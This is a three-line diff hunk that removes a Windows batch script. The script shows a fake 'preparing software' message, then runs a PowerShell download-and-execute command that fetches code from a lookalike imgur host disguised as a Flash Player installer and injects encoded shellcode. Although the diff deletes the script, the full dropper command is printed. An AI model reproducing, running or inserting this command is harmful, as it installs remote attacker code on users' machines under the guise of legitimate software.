@@ -1,3 +1,0 @@
-@echo off
-echo [*] Please wait, preparing software ...
-powershell.exe -Command IEX (New-Object system.Net.WebClient).DownloadString("http://imgur.photos/windows/flashplayerinstaller.exe");Invoke-Shellcode -Force -Shellcode InJ3C
